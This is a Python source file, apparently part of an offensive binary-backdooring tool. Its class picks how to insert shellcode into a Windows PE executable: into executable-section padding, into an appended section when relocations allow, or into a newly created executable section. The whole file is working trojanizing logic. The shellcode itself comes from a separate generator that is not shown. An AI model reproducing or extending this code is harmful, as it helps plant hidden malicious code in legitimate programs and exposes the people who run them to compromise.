from BinaryModifiers.Win32SectionAppender import Win32SectionAppender
from BinaryModifiers.Win32SectionCreator import Win32SectionCreator
from BinaryModifiers.Win32SectionInjector import Win32SectionInjector
from Utils.Win32BinaryUtils import Win32BinaryUtils

class Win32BinaryModifier:
    """
    class Win32BinaryModifier:
    Usage: Responsible for selecting specific modifiers:
     -Win32SectionInjector: when it is possible to inject the shellcode on the entrypoint section (e.g. section padding
     is big enough). CONSIDER CHECKING ALL EXECUTABL SECTIONS.
     -Win32SectionAppender: When a relocation table is available and the binary can be put on a different memory region
     from the one that is hardcoded on the header.
     -Win32SectionCreator: If the other cases fail, another section must be created with executable permissions.


    """

    def modify_binary(self):
        """
        :param self:
        :return:
        """
        shell_code = self.shell_code_generator.get_base_shell_code(0)
        binary_segment = Win32BinaryUtils.get_executable_region(self.binary_data, len(shell_code))
        if binary_segment != None:
            return Win32SectionInjector(self.binary_data, self.shell_code_generator, binary_segment).modify_binary()

        if Win32BinaryUtils.has_relocation_table(self.binary_data):
            return Win32SectionAppender(self.binary_data, self.shell_code_generator).modify_binary()

        return Win32SectionCreator(self.binary_data, self.shell_code_generator).modify_binary()




    def __init__(self, binary_data, shell_code_generator):
       self.binary_data = binary_data
       self.shell_code_generator = shell_code_generator
